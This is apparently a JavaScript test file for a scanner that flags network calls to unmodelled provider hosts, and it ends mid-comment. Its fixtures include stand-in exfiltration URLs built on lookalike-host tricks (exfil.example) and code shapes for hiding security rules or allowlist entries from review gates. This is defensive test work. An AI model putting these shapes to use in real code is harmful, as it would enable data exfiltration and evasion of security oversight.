// ══════════════════════════════════════════════════════════════════════════════
// THE PROVIDER CONTROLS, OBSERVED  ·  S-1 / S-2
//
// WHY THIS FILE EXISTS
// Round 4 added five provider mechanisms and shipped them with NO test. A
// security reviewer deleted each one outright — five mutants — and all five
// SURVIVED against every suite that imports the scanner. The strings
// `captured-entrypoint`, `undeclared-dependency`, `lexer-unterminated`,
// `SPECIFIER_DISPOSITION` and `REGEX_KEYWORDS` appeared nowhere in the repo
// outside the file that defines them. Deleting a security control and watching
// the gate stay green is the SEC-9 class the scanner's own header warns about:
// coverage asserted, not delivered.
//
// So every mechanism below is stated as a PROPERTY and checked three ways:
//   positive  — the shape the mechanism must catch IS caught
//   negative  — the innocent shape beside it is NOT caught (no noise; a control
//               that fires on everything is not a control)
//   deletion  — tests/mutations/provider-mutants.mjs restores the pre-round-4
//               behaviour of each rule, and the run must kill it
//
// None of these asserts that a source file contains a string. They assert the
// verdict the scanner returns for code, which is the only thing a caller acts on.
//
//   node --test tests/round5-provider-controls.test.mjs
// ══════════════════════════════════════════════════════════════════════════════
import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, readdirSync, writeFileSync, mkdtempSync, rmSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve as resolvePath, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { discoverEndpoints, driveEndpoint, mintJWT, IMG } from './helpers/analyze-harness.mjs';
// S-1. The inventory is DERIVED from the scanner's source; the mutant catalog
// CLAIMS mechanisms from it. PC-6a reconciles the two, so neither an added rule
// nor a deleted one can leave the other side quietly stale.
import { deriveMechanisms, deriveRuntimeMechanisms, deriveGlobalEffects, behaviourFingerprint, behaviourCorpus,
  reconcile, inventoryClosure }
  from './helpers/authority-inventory.mjs';
import { PROVIDER_MUTANTS, INVENTORY_MODULES } from './mutations/provider-mutants.mjs';

const SCAN_URL = process.env.PROVIDER_SCAN_PATH
  ? new URL(`file://${process.env.PROVIDER_SCAN_PATH}`)
  : new URL('./helpers/provider-scan.mjs', import.meta.url);
const S = await import(SCAN_URL.href);
const { scanModule, discoverModules, SCANNED_EXTENSIONS, NETWORK_ENTRYPOINTS } = S;

/** A file path as an importable URL, whichever side of the env indirection it came from. */
const SURFACE_URL_HREF = (file) => new URL(`file://${file.startsWith('/') ? '' : '/'}${file.split(String.fromCharCode(92)).join('/')}`).href;

const BT = String.fromCharCode(96);
const shapes = (source, path = 't.mjs') =>
  [...new Set(scanModule({ path, source }).dynamic.map((d) => d.shape))];
const hosts = (source, path = 't.mjs') =>
  scanModule({ path, source }).literals.map((l) => l.host);
const reports = (source, shape, path = 't.mjs') => shapes(source, path).includes(shape);

// ════════════════════════════════════════════════════════════════════════════
// MECHANISM 1 & 2 — A CAPTURED ENTRYPOINT
// ════════════════════════════════════════════════════════════════════════════
describe('PC-1 reading `fetch` out of call position is itself a finding', () => {
  // PROPERTY: the scanner follows `fetch(` and `fetchWithRetry(` and `new URL(`.
  // Code that takes a REFERENCE to one and calls it under another name is a call
  // site the scanner cannot follow, so it must be refused rather than ignored.
  // 30 of 342 matrix cells were silently green in both layers before round 4,
  // every one of them a module-scope capture.
  const CAPTURES = [
    ['globalThis.fetch', 'const F = globalThis.fetch;\nexport const f = (q) => F(E + q);'],
    ['window.fetch', 'const F = window.fetch;\nexport const f = (q) => F(E + q);'],
    ['self.fetch', 'const F = self.fetch;\nexport const f = (q) => F(E + q);'],
    ['bare const', 'const F = fetch;\nexport const f = (q) => F(E + q);'],
    ['let capture', 'let F = fetch;\nexport const f = (q) => F(E + q);'],
    ['var capture', 'var F = fetch;\nexport const f = (q) => F(E + q);'],
  ];

  test('PC-1a every capture form is reported', () => {
    for (const [label, src] of CAPTURES) {
      assert.ok(reports(src, 'captured-entrypoint'),
        `${label}: a captured entrypoint must be refused, not ignored`);
    }
  });

  test('PC-1b an ordinary call is NOT reported — the control must not be noise', () => {
    // A scanner that fires on its own helper produces findings nobody can act
    // on, and noise devalues every other verdict it gives.
    for (const src of [
      "export const f = (q) => fetch('https://api.ok.example/v1');",
      'export async function f(q) { return fetch(URL_CONST); }',
      'async function fetchWithRetry(url, options) { return url; }',
      'const label = "the word fetch inside a string";\nexport const f = () => label;',
      '// a comment mentioning globalThis.fetch\nexport const f = () => 1;',
    ]) {
      assert.equal(reports(src, 'captured-entrypoint'), false,
        `false positive on: ${src.slice(0, 50)}`);
    }
  });

  test('PC-1c the capture is reported even when the destination is a literal', () => {
    // The destination being resolvable does not make the CALL followable: the
    // scanner cannot tell that `F(x)` is a request at all.
    const src = "const F = globalThis.fetch;\nexport const f = () => F('https://api.lit.example/v1');";
    assert.ok(reports(src, 'captured-entrypoint'));
  });
});

// ════════════════════════════════════════════════════════════════════════════
// MECHANISM 3 — AN UNTERMINATED CONSTRUCT
// ════════════════════════════════════════════════════════════════════════════
describe('PC-2 a construct that never closes is a finding, not a silence', () => {
  // PROPERTY: if a string or template is still open at EOF, the lexer has blanked
  // a region it should not have, and every verdict after that point is a lie.
  // The round-9 runaway blanked from line 1010 to EOF and reported ZERO provider
  // hosts in analyze.js while passing.
  test('PC-2a an unterminated template is reported', () => {
    assert.ok(reports(`const a = ${BT}oops;`, 'lexer-unterminated'));
  });

  test('PC-2b a well-formed file is not', () => {
    for (const src of [
      "export const f = () => fetch('https://api.x.example/v1');",
      `const t = ${BT}a\${b}c${BT};\nexport const f = () => t;`,
      `const n = ${BT}outer \${ ${BT}inner${BT} } end${BT};\nexport const f = () => n;`,
    ]) {
      assert.equal(reports(src, 'lexer-unterminated'), false, src.slice(0, 40));
    }
  });

  test('PC-2c AND the blinding it protects against is caught in the same file', () => {
    // The consequence, not the symptom: a provider literal after the runaway is
    // invisible. Asserted together so that a future change which keeps the flag
    // but loses the protection fails here.
    const canary = `const x = ${BT}unclosed;\nexport const f = () => fetch('https://api.canary.example/v1');`;
    const r = scanModule({ path: 't.mjs', source: canary });
    assert.ok(r.dynamic.some((d) => d.shape === 'lexer-unterminated'),
      'a blinded region must at minimum be reported as blinded');
  });
});

// ════════════════════════════════════════════════════════════════════════════
// MECHANISM 4 — DECLARED DISPOSITION PER DEPENDENCY
// ════════════════════════════════════════════════════════════════════════════
describe('PC-3 a dependency nobody classified is a finding by default', () => {
  // PROPERTY: the denylist answered the wrong question. It enumerated the 21
  // transports somebody had thought of; `node:http2`, `node:tls`, `ws` and an
  // aliased `createRequire` all passed the gate at 43/43. Every BARE specifier
  // under api/ must carry a declared disposition, so the next transport added
  // fails by NAME without anyone having predicted its name.
  test('PC-3a an unclassified bare dependency is reported by name', () => {
    for (const spec of ['node:http2', 'node:tls', 'ws', 'socket.io-client',
      'follow-redirects', 'cross-fetch', 'isomorphic-fetch', 'got', 'phin']) {
      const r = scanModule({ path: 't.mjs',
        source: `import x from '${spec}';\nexport const f = (o) => x(o);` });
      const hit = r.dynamic.find((d) => d.transport === spec);
      assert.ok(hit, `${spec} must be reported`);
      assert.ok(['undeclared-dependency', 'unsupported-transport'].includes(hit.shape), spec);
    }
  });

  test('PC-3b a DECLARED dependency and a relative import are not reported', () => {
    // BOTH transport shapes, not just `undeclared-dependency`. The narrow
    // version filtered on that one string, so relabelling the ONE entry in
    // SPECIFIER_DISPOSITION from 'fetch-based' to 'unsupported' turned a clean
    // import into an `unsupported-transport` finding and this test stayed green
    // over it — the mutation harness reported it MISATTRIBUTED. What the
    // disposition MEANS is what the entry decides, so the assertion has to be
    // about the verdict, not about one of its spellings.
    const TRANSPORT_SHAPES = ['undeclared-dependency', 'unsupported-transport'];
    assert.deepEqual(
      shapes("import { createClient } from '@supabase/supabase-js';\nexport const f = () => createClient(a, b);")
        .filter((s) => TRANSPORT_SHAPES.includes(s)), [],
      'a dependency DECLARED fetch-based is observable at runtime and must produce no finding');
    assert.deepEqual(
      shapes("import { x } from './y.js';\nexport const f = () => x();")
        .filter((s) => TRANSPORT_SHAPES.includes(s)), [],
      'a relative import is our own code, not a dependency');
  });

  test('PC-3c a specifier named only in a comment or a prompt is not an import', () => {
    const noise = [
      '// we deliberately do not use node:http2 here',
      `const PROMPT = ${BT}Never import undici or ws.${BT};`,
      "export const f = () => fetch('https://api.clean.example/v1');",
    ].join('\n');
    assert.deepEqual(shapes(noise).filter((s) => s === 'undeclared-dependency'), []);
    assert.deepEqual(hosts(noise), ['api.clean.example']);
  });

  test('PC-3e a known transport is reported AS a transport, by name', () => {
    // PC-3a accepts EITHER shape, because either one is a finding. That made it
    // blind to the difference between them — and the difference is the whole
    // point of UNSUPPORTED_TRANSPORTS. `node:https` reported as merely
    // "undeclared" says "nobody classified this"; reported as
    // "unsupported-transport" it says "this reaches hosts by a route neither
    // layer can follow". Deleting the denylist turned every one of the second
    // kind into the first, and PC-3a stayed green over it.
    for (const spec of ['node:https', 'node:http', 'node:net', 'axios', 'undici', 'got']) {
      const r = scanModule({ path: 't.mjs',
        source: `import x from '${spec}';\nexport const f = (o) => x(o);` });
      const hit = r.dynamic.find((d) => d.transport === spec);
      assert.ok(hit, `${spec} produced no finding at all`);
      assert.equal(hit.shape, 'unsupported-transport',
        `${spec} is a declared unfollowable transport and must be named as one, not ` +
        `merely as an unclassified dependency (got ${hit.shape})`);
    }
  });

  test('PC-3d EVERY bare specifier in production carries a disposition', () => {
    // The property against the real tree, not against fixtures.
    const offenders = [];
    for (const m of discoverModules(new URL('../api/', import.meta.url))) {
      for (const d of scanModule(m).dynamic) {
        if (d.shape === 'undeclared-dependency' || d.shape === 'unsupported-transport') {
          offenders.push(`${m.path}:${d.line} ${d.shape} ${d.transport}`);
        }
      }
    }
    assert.deepEqual(offenders, []);
  });
});

// ════════════════════════════════════════════════════════════════════════════
// MECHANISM 5 — REGEX IN KEYWORD POSITION
// ════════════════════════════════════════════════════════════════════════════
describe('PC-4 a regex after a keyword is a regex, not a division', () => {
  // PROPERTY: `return /[`]{3}/.test(s)` lexed as arithmetic, the backtick inside
  // the character class opened a template that never closed, and every literal
  // to the next backtick was blanked. One plausible sanitizer helper inserted
  // into a copy of api/analyze.js made a planted provider invisible while the
  // guard written for that exact runaway passed all four of its assertions.
  const KEYWORDS = ['return', 'typeof', 'case 1:', 'await', 'throw', 'in', 'of', 'yield', 'void', 'delete'];

  test('PC-4a a canary literal survives a keyword-position regex containing a backtick', () => {
    for (const kw of KEYWORDS) {
      const src = `function g(s) { ${kw} /[${BT}]{3}/.test(s); }\n`
        + "export const f = () => fetch('https://api.canary.example/v1');";
      assert.deepEqual(hosts(src), ['api.canary.example'],
        `after \`${kw}\` the canary was blinded`);
    }
  });

  test('PC-4b genuine division is still division', () => {
    // The negative control. Treating every `/` as a regex would blank real code
    // and is just the same defect pointing the other way.
    const src = "const r = (a + b) / c;\nconst q = total/count;\n"
      + "export const f = () => fetch('https://api.div.example/v1');";
    assert.deepEqual(hosts(src), ['api.div.example']);
    assert.equal(reports(src, 'lexer-unterminated'), false);
  });
});

// ════════════════════════════════════════════════════════════════════════════
// S-2 — EVERY PROVIDER-CAPABLE ENDPOINT IS RUNTIME-OBSERVED
// ════════════════════════════════════════════════════════════════════════════
describe('PC-5 runtime observation covers every API entrypoint, not one file', () => {
  // The reviewer's witness: a literal-free adapter appended to
  // api/submit-candidate.js left the gate at 876 pass / 0 fail. No test drove
  // that file, nor api/confirm-identity.js; the only runtime observer drove
  // api/analyze.js. So any static-silent shape in those files was both-blind by
  // construction, and the static layer is incomplete BY DESIGN.
  //
  // MY FIRST VERSION OF THIS TEST WAS VACUOUS and passed for the wrong reason:
  // it decided an endpoint was "driven" if its FILENAME appeared anywhere under
  // tests/ — which it did, in a comment. It reported all three covered while two
  // of them were not executed by anything. Fixed by actually running them.

  test('PC-5a endpoints are DISCOVERED, and the inventory is non-trivial', () => {
    const eps = discoverEndpoints();
    assert.ok(eps.length >= 3, `only ${eps.length} endpoints discovered`);
    assert.ok(eps.includes('analyze.js') && eps.includes('submit-candidate.js')
      && eps.includes('confirm-identity.js'), eps.join(','));
  });

  test('PC-5b EVERY discovered endpoint is executed under the dispatcher', async () => {
    // Executed, not grepped. Each handler runs both unauthenticated and
    // authenticated, and any host it touches is recorded OUT OF BAND after it
    // returns — so a try/catch inside the handler cannot hide an attempt.
    for (const name of discoverEndpoints()) {
      for (const headers of [{}, { authorization: `Bearer ${mintJWT()}` }]) {
        const r = await driveEndpoint(name, {
          body: { scan_uuid: '11111111-2222-3333-4444-555555555555', name: 'probe', imageData: IMG },
          headers,
        });
        assert.deepEqual(r.unknownHosts, [],
          `${name} reached an unmodelled external host: ${r.unknownHosts.join(', ')}`);
        assert.ok(r.status === null || typeof r.status === 'number',
          `${name} returned no usable status`);
      }
    }
  });

  test('PC-5d a host is an AUTHORITY, never a substring of the href', async () => {
    // THE WITNESS, from an independent security review. Every dispatcher branch
    // matched with `url.includes('<host>')`, so three lookalikes were ANSWERED
    // 200 and never recorded:
    //
    //   https://exfil.example/steal?cb=fake.supabase.co
    //
    // is the sharpest — the real host is `exfil.example` and the modelled name
    // appears only in the QUERY STRING, yet it took the Supabase branch. The
    // other two are the ordinary suffix trick. This is precisely the SEC-9
    // failure the harness's own comment says was fixed, still live in the
    // matcher underneath it: a harness that invents a success launders an
    // unknown into a pass.
    const { harness } = await import('./helpers/analyze-harness.mjs');
    const h = await harness();
    try {
      const LOOKALIKES = [
        'https://api.anthropic.com.exfil.example/v1/messages',
        'https://exfil.example/steal?cb=fake.supabase.co',
        'https://api.voyageai.com.exfil.example/v1/embeddings',
        'https://vision.googleapis.com.exfil.example/v1/images:annotate',
        'https://fake.supabase.co.exfil.example/rpc/decrement_user_daily_scan',
      ];
      for (const u of LOOKALIKES) {
        await assert.rejects(() => globalThis.fetch(u), /UNSTUBBED EXTERNAL HOST/,
          `${u} was ANSWERED — a modelled host appearing anywhere in the href is not that host`);
      }
      for (const u of LOOKALIKES) {
        assert.ok(h.state.unknownHosts.includes(u),
          `${u} was refused but NOT RECORDED, so an out-of-band audit would miss it`);
      }
      // And the control: the genuine hosts must still be answered, or this
      // "fix" has simply broken every provider the harness exists to model.
      assert.equal((await globalThis.fetch('https://api.anthropic.com/v1/messages')).status, 200);
      assert.equal((await globalThis.fetch('https://fake.supabase.co/rest/v1/x')).status, 200);
    } finally { h.restore(); }
  });

  test('PC-5c a provider planted in ANY endpoint is observed — the negative control', async () => {
    // Without this, PC-5b would pass simply because the endpoints happen not to
    // call anything on the paths exercised. The synthetic module proves the
    // MECHANISM: an unmodelled host reached from an endpoint-shaped handler is
    // recorded rather than silently answered.
    const { harness } = await import('./helpers/analyze-harness.mjs');
    const h = await harness();
    try {
      await assert.rejects(() => globalThis.fetch('https://api.unmodelled-vendor.example/v1'),
        /UNSTUBBED EXTERNAL HOST/,
        'an unknown host must be refused, never answered 200 by default');
      h.assertNoUnknownHosts && assert.throws(() => h.assertNoUnknownHosts('the control'),
        /UNMODELLED EXTERNAL HOST/);
    } finally { h.restore(); }
  });
});

// ════════════════════════════════════════════════════════════════════════════
// S-1 ROUND 6 — THE DENOMINATOR IS DERIVED, NOT CHOSEN
// ════════════════════════════════════════════════════════════════════════════
describe('PC-6 unobserved security authority is a test failure', () => {
  // THE FINDING. The provider mutation harness reported "8/8 killed — all
  // provider controls are observed". Eight was the number of rules somebody had
  // written a mutant for. The scanner holds thirty-one decision sites; the other
  // twenty-three were not failing and not passing, they were outside the frame.
  //
  // So the inventory is DERIVED FROM THE SCANNER'S OWN SOURCE, and this test
  // fails when a mechanism has no mutant bound to it. A rule added tomorrow
  // appears in the inventory the moment it is written, claimed by nothing, and
  // the gate fails BY NAME — which is the property S-1 asked for and a count
  // could never deliver.

  test('PC-6a every derived mechanism has an observing mutant, and every claim is live', async () => {
    // BOTH modules. S-2 added tests/helpers/runtime-surface.mjs, and a module
    // outside the inventory is a module whose rules nothing can be shown to
    // observe — which is the S-1 finding, reproduced inside its own fix.
    //
    // Read from the paths the ENV points at, so the inventory under a mutation
    // run is the inventory of the code that run is actually judging.
    const SURFACE_FILE = process.env.RUNTIME_SURFACE_PATH
      ? process.env.RUNTIME_SURFACE_PATH
      : fileURLToPath(new URL('./helpers/runtime-surface.mjs', import.meta.url));
    // THE SCOPE IS CLOSED UNDER RELATIVE IMPORT, not a fixed list of two files.
    // A reviewer's shape was "put the rule in a NEW module and import it" — and
    // a fixed list of modules is the same enumeration failure as a fixed list
    // of shapes, one level out.
    const MODULES = inventoryClosure(
      [
        { name: INVENTORY_MODULES.scan, file: fileURLToPath(SCAN_URL) },
        { name: INVENTORY_MODULES.surface, file: SURFACE_FILE },
      ],
      {
        readFile: (f) => readFileSync(f, 'utf8'),
        resolve: (from, spec) => {
          const target = resolvePath(dirname(from), spec);
          return existsSync(target) ? target : null;
        },
      },
    ).map((m) => [m.name, m.file, SURFACE_URL_HREF(m.file)]);

    // ── TWO DERIVATIONS, BECAUSE ONE OF THEM HAS A SHAPE BLIND SPOT ─────────
    //
    // SOURCE catches everything at module scope, exported or not, and REFUSES
    // any construct it cannot classify. RUNTIME reads the module's real export
    // namespace, which is shape-proof — a default export, a class, a
    // destructured re-export and a computed name are all just bindings by then
    // — and enumerates the function-valued members of exported tables and the
    // prototype methods of exported classes, so a rule HIDDEN AS A PROPERTY of
    // an existing table is a mechanism of its own.
    //
    // An independent security reviewer found the first version of this test
    // seeing three syntactic shapes and nothing else. `export default function`,
    // `export class`, a destructured binding, a bare assignment, a second
    // declarator and a double-quoted `shape:` all produced NO mechanism id, so
    // nothing claimed them and this assertion stayed green over a rule it could
    // not see. PC-6d below is the end-to-end witness for that.
    const mechanisms = [];
    const seen = new Set();
    for (const [name, file, href] of MODULES) {
      // ONE import per module, wrapped by the globalThis snapshot, because a
      // second import installs the global before the snapshot is taken.
      const globals = deriveGlobalEffects(href, name); const namespace = await import(href);
      for (const m of [
        ...deriveMechanisms(readFileSync(file, 'utf8'), name),
        ...(namespace ? deriveRuntimeMechanisms(namespace, name) : []),
        ...globals,
      ]) {
        if (!seen.has(m.id)) { seen.add(m.id); mechanisms.push(m); }
      }
    }
    assert.deepEqual(mechanisms.filter((m) => m.kind === 'global').map((m) => m.id), [],
      'a verification module INSTALLED something on globalThis at import. A rule that reaches ' +
      'its consumer through a global is a rule, whatever syntax put it there.');
    assert.ok(mechanisms.length >= 40,
      `the inventory derived only ${mechanisms.length} mechanisms from two modules that ` +
      'plainly have more — the deriver has stopped seeing the files');
    assert.deepEqual(mechanisms.filter((m) => m.kind === 'unclassified').map((m) => m.id), [],
      'a module-scope construct that BINDS something and this deriver could not read. An ' +
      'unrecognised shape must never vanish: make it a form the deriver knows, or teach the ' +
      'deriver to read it.');

    const { unobserved, orphaned } = reconcile(mechanisms, PROVIDER_MUTANTS);

    assert.deepEqual(unobserved.map((m) => m.id), [],
      'UNOBSERVED SECURITY AUTHORITY. These decision sites exist in the scanner and no ' +
      'mutant deletes them, so no test can be said to enforce them. Add a mutant to ' +
      'tests/mutations/provider-mutants.mjs binding `mechanism` to each id, and an ' +
      'observing assertion that the mutant makes fail.');

    assert.deepEqual(orphaned.map((o) => o.mechanism), [],
      'a mutant claims a mechanism that no longer exists in the scanner — the claim is ' +
      'stale, and a stale claim is an unobserved rule wearing a badge');
  });

  test('PC-6b the declared entrypoint list is what the scan actually follows', () => {
    // NETWORK_ENTRYPOINTS was exported, called "one declared source of truth for
    // what reaches the network", read by NOBODY, and emptying it changed
    // nothing — the list that mattered was transcribed a second time inside the
    // call-site regex. The mechanical inventory found it on its first run.
    // THE LIST BELOW IS INDEPENDENT OF THE VALUE UNDER TEST, and it has to be.
    // My first version iterated NETWORK_ENTRYPOINTS itself — so a mutant that
    // replaced the list with `['__never_called__']` produced a fixture calling
    // `__never_called__(...)`, which the regex derived from the same list
    // matched perfectly, and the test passed. That is the NO-1g defect exactly:
    // a test that derives its input from the value under test cannot observe
    // that value changing.
    //
    // These three are how production actually reaches the network, whatever the
    // constant happens to say.
    const MUST_FOLLOW = ['fetch', 'fetchWithRetry', 'new URL'];
    for (const name of MUST_FOLLOW) {
      assert.ok(NETWORK_ENTRYPOINTS.includes(name),
        `${name} is how this codebase reaches the network and must be a declared entrypoint`);
      const src = `export const f = (q) => ${name}(TARGET + q);`;
      const r = scanModule({ path: 't.mjs', source: src });
      assert.ok(r.dynamic.some((d) => d.shape === 'non-literal-target'),
        `${name} is a DECLARED network entrypoint, and a call to it with an unresolvable ` +
        'target was not located. The declaration and the scan disagree.');
    }
  });

  test('PC-6c an escaped quote does not end a string — the lexer reads escapes', () => {
    // BACKSLASH had no observer at all: the escape rule is what keeps a quote
    // inside a string from terminating it. Without it, everything after the
    // apostrophe is lexed as CODE, and a provider literal on the next line
    // lands in a region the scanner has already lost track of.
    //
    // ON ONE LINE, DELIBERATELY. My first fixture put the call on the NEXT
    // line, and the mutant survived it: a quoted string may not cross a
    // newline, so the lexer resynchronised at the line break and found the host
    // anyway. The damage from a lost escape is confined to its own line, so the
    // canary has to sit on that line to see it.
    const q = String.fromCharCode(39);
    const bs = String.fromCharCode(92);
    const src = `const s = ${q}it${bs}${q}s a label${q}; `
      + `export const f = () => fetch(${q}https://api.escape-canary.example/v1${q});`;
    assert.deepEqual(hosts(src), ['api.escape-canary.example'],
      'an escaped quote terminated the string and blinded the scanner to the call after it');
    assert.equal(reports(src, 'lexer-unterminated'), false);
  });
});

// ════════════════════════════════════════════════════════════════════════════
// S-1 · THE DERIVER'S OWN BLIND SPOTS — found by an independent reviewer
// ════════════════════════════════════════════════════════════════════════════
describe('PC-6d a rule written in ANY shape is derived, or refused by name', () => {
  // THE WITNESS. The first version of the deriver recognised three syntactic
  // shapes — `const|let|var NAME =`, `function NAME(`, and a SINGLE-QUOTED
  // `shape:`. A security reviewer pointed at the obvious consequence: write the
  // rule any other way and the inventory produces no id for it, nothing claims
  // it, and PC-6a stays green over a security rule nobody observes. That is
  // precisely the S-1 finding, reproduced inside S-1's own fix — a gate that
  // only sees the shapes its author happened to use.
  //
  // Each entry below plants a REAL rule in a shape the old deriver could not
  // see. Every one must now produce at least one mechanism that no mutant
  // claims — either because it is a new binding/detector, or because it is
  // REFUSED as unclassified. Widening three patterns to seven would have been
  // the same mistake again; the refusal is what makes the eighth shape safe.
  const PLANTED = {
    'export default function':
      'export default function auditEverything(mod) { return []; }',
    'an exported class with a rule method':
      'export class SecretScanner { scan(mod) { return /api_key/.test(mod.source); } }',
    'a destructured module binding':
      'const { freeze: RULE_FREEZE } = Object;\nexport const useIt = () => RULE_FREEZE({});',
    'an assignment with no declaration':
      'globalThis.HIDDEN_PROVIDER_RULE = /secret/;',
    'a second declarator':
      'const FIRST_ONE = 1, HIDDEN_RULE = /secret/;\nexport const both = () => [FIRST_ONE, HIDDEN_RULE];',
    'a DOUBLE-quoted finding shape':
      'export function scanSecrets(m) { return [{ file: m.path, line: 1, shape: "hardcoded-secret" }]; }',
    'a finding shape assembled at runtime':
      'const KIND = "secret";\nexport function scanSecrets2(m) { return [{ file: m.path, line: 1, shape: KIND + "-leak" }]; }',
    'a rule hidden as a property of a table':
      'export const EXTRA_RULES = { secretScan: (m) => /api_key/.test(m.source) };',
    // ── AND THE SHAPES A SECOND REVIEWER FOUND, AFTER THE FIRST FIX ────────
    // Every one of these ran the control suite 21/21 GREEN over a real,
    // behaviour-changing security rule. None contains a top-level `=`, which is
    // all the previous refusal knew how to look for.
    'an IIFE installing a rule':
      '(function installRule(){ globalThis.__gwRule = () => 1; })();',
    'a labelled block':
      'rules: { globalThis.__gwRule2 = () => 1; }',
    'a top-level if — the ordinary env-flag shape':
      'if (process.env.GW_RELAX) { globalThis.__gwRule3 = () => 1; }',
    'a top-level loop':
      "for (const k of ['a']) { globalThis['__gwRule_' + k] = () => 1; }",
    'a destructuring assignment with no keyword':
      '({ freeze: globalThis.__gwRule4 } = Object);',
    'Object.defineProperty at module scope':
      "Object.defineProperty(globalThis, '__gwHostAllow', " +
      "{ value: (h) => h.endsWith('.trusted.example'), enumerable: false, configurable: true });",
    // ── AND THE TWO THE SECOND REVIEWER FOUND AFTER THE SECOND FIX ─────────
    // Both exploit the same idea: A LINE HOLDS AS MANY STATEMENTS AS YOU LIKE.
    // The refusal was line-oriented, so `/^import\s/` exempted everything after
    // the import on that line, and a claimed declaration exempted its line for
    // the whole length. Splitting on top-level `;` closes the first; the second
    // hides inside an initializer where no split reaches it, and is caught
    // instead by what importing the module DOES.
    'a statement riding on an import line':
      "import { fileURLToPath as __fu2 } from 'node:url'; " +
      "Object.defineProperty(globalThis, '__gwHostAllow2', { value: (h) => true, configurable: true });",
    'a comma operator inside an already-claimed declaration':
      "const __claimed = (Object.defineProperty(globalThis, '__gwHostAllow3', " +
      "{ value: (h) => true, configurable: true }), new Set());",
    // ── AND THE TWO THAT DEFEATED THE GLOBAL CHECK ─────────────────────────
    // Both say the same thing from opposite sides: asking "did IMPORTING this
    // module add a key to THIS object" lets a rule avoid either word.
    'a rule installed on an intrinsic rather than globalThis':
      "Object.defineProperty(Math, '__gwHostAllow4', " +
      "{ value: (h) => h.endsWith('.trusted.example'), enumerable: false, configurable: true });",
    'a rule installed LAZILY, from inside a function body':
      'export function __lazyRule(h) {\n' +
      "  if (!globalThis.__gwHostAllow5) globalThis.__gwHostAllow5 = (x) => x.endsWith('.trusted.example');\n" +
      '  return globalThis.__gwHostAllow5(h);\n}',
  };

  // A DATA entry added to the dependency ALLOWLIST. Not appended — edited in,
  // because that is how the attack actually looks. It is handled separately
  // from PLANTED above since it replaces a line rather than adding one.
  const ALLOWLIST_ENTRY = [
    "  '@supabase/supabase-js': 'fetch-based',",
    "  '@supabase/supabase-js': 'fetch-based',\n  '@vendor/telemetry-beacon': 'no-network',",
  ];

  const CORPUS = behaviourCorpus();
  const BASE_FINGERPRINT = behaviourFingerprint(SCAN_URL.href, CORPUS);

  test('PC-6d every planted shape is NOTICED — by the inventory or by drift', async () => {
    const base = readFileSync(fileURLToPath(SCAN_URL), 'utf8');
    assert.ok(BASE_FINGERPRINT, 'the baseline fingerprint must be computable, or drift means nothing');
    const dir = mkdtempSync(join(tmpdir(), 'pc6d-'));
    try {
      let n = 0;
      for (const [label, planted] of Object.entries(PLANTED)) {
        const file = join(dir, `scan${n++}.mjs`);
        writeFileSync(file, `${base}\n${planted}\n`, 'utf8');
        const g = deriveGlobalEffects(SURFACE_URL_HREF(file), INVENTORY_MODULES.scan); let namespace = null; try { namespace = await import(SURFACE_URL_HREF(file)); } catch {}
        const derived = [
          ...deriveMechanisms(readFileSync(file, 'utf8'), INVENTORY_MODULES.scan),
          ...(namespace ? deriveRuntimeMechanisms(namespace, INVENTORY_MODULES.scan) : []),
          ...g,
        ];
        const { unobserved } = reconcile(derived, PROVIDER_MUTANTS);
        // EITHER an unclaimed mechanism OR observable drift. The two are
        // complementary, and each has a blind spot the other covers:
        //   · the inventory is MODULE-SCOPE, so it cannot see a rule that
        //     installs lazily from inside a function body (a8);
        //   · the fingerprint only sees a rule the CORPUS TRIGGERS, so it
        //     cannot see an allowlist entry for a package the corpus never
        //     imports (a2).
        // Neither is sufficient. The claim is that between them the gate
        // NOTICES — and that claim is what this assertion states, rather than
        // the stronger one either layer could not support alone.
        const drifted = behaviourFingerprint(SURFACE_URL_HREF(file), CORPUS) !== BASE_FINGERPRINT;
        assert.ok(unobserved.length > 0 || drifted,
          `${label}: a security rule written this way produced NO unclaimed mechanism AND no ` +
          'observable drift. The gate would stay green over a rule nothing observes.');
      }

      // THE ALLOWLIST ENTRY. Its own case, because the witness was that adding
      // ONE line to SPECIFIER_DISPOSITION turned a real finding
      // (["undeclared-dependency"]) into [] with the suite at 21/21. Emptying
      // the table fails LOUD, so only a per-ENTRY mechanism can see an addition.
      const file = join(dir, 'allowlist.mjs');
      writeFileSync(file, base.replace(ALLOWLIST_ENTRY[0], ALLOWLIST_ENTRY[1]), 'utf8');
      const g2 = deriveGlobalEffects(SURFACE_URL_HREF(file), INVENTORY_MODULES.scan); let ns2 = null; try { ns2 = await import(SURFACE_URL_HREF(file)); } catch {}
      const derived = [
        ...deriveMechanisms(readFileSync(file, 'utf8'), INVENTORY_MODULES.scan),
        ...(ns2 ? deriveRuntimeMechanisms(ns2, INVENTORY_MODULES.scan) : []),
        ...g2,
      ];
      const { unobserved } = reconcile(derived, PROVIDER_MUTANTS);
      assert.ok(unobserved.some((m) => m.name.includes('telemetry-beacon')),
        'an entry added to the dependency ALLOWLIST produced no unclaimed mechanism — ' +
        `got ${unobserved.map((m) => m.id).join(', ') || '(nothing)'}`);
    } finally { rmSync(dir, { recursive: true, force: true }); }
  });

  test('PC-6e and the control: the UNCHANGED module leaves nothing unclaimed', async () => {
    // Without this, PC-6d would pass on a deriver that simply reports
    // everything as unobserved — the universal-killer shape, in an inventory.
    const file = fileURLToPath(SCAN_URL);
    const g3 = deriveGlobalEffects(SCAN_URL.href, INVENTORY_MODULES.scan); const ns3 = await import(SCAN_URL.href);
    const derived = [
      ...deriveMechanisms(readFileSync(file, 'utf8'), INVENTORY_MODULES.scan),
      ...(ns3 ? deriveRuntimeMechanisms(ns3, INVENTORY_MODULES.scan) : []),
      ...g3,
    ];
    const { unobserved } = reconcile(derived, PROVIDER_MUTANTS);
    assert.deepEqual(unobserved.map((m) => m.id), [],
      'the unmodified scanner must leave nothing unclaimed, or PC-6d proves only that the ' +
      'deriver is noisy');
  });
});

// ════════════════════════════════════════════════════════════════════════════
// PC-6f · [OPEN · S1-H2] THE INVENTORY IS MODULE-SCOPE, AND A RULE NEED NOT BE
// ════════════════════════════════════════════════════════════════════════════
describe('PC-6f the residual, recorded rather than implied', () => {
  // FOUND BY AN INDEPENDENT SECURITY REVIEWER, AFTER SIX FIXES, AND NOT CLOSED.
  //
  // Two witnesses defeated every layer this round built:
  //
